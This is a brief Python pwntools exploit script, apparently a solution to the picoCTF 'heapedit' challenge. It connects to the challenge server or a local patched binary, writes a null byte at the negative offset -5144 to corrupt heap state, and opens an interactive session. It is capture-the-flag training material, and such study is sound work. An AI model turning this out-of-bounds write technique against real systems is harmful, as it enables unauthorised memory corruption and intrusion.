from pwn import *
host = "mercury.picoctf.net"
port = 34499
exe ="heapedit_patched"
binary = context.binary = ELF(exe,checksec=False)
rop = ROP(binary)      
 
def conn():
    if args.LOCAL:
        return process(exe)
    else :
        return remote(host,port)
def main():
    p = conn()
    p.sendlineafter(b"Address:",b'-5144')
    p.sendlineafter(b"Value",b'\0')
    p.interactive()

if __name__ == "__main__":
     main()